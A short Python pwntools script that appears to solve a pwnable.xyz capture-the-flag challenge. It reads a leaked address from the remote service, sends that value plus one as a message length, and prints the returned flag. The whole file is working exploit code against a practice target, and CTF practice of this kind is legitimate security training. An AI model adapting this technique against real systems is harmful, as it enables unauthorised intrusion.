from pwn import *

r = remote('svc.pwnable.xyz', 30000)

r.recvuntil('Leak: ')
leak = int(r.recvuntil('\n')[:-1], 16)

r.recvuntil('Length of your message: ')
r.sendline(str(leak+1))
r.recvuntil('Enter your message: ')
r.sendline('\n')

print r.recvuntil('}')
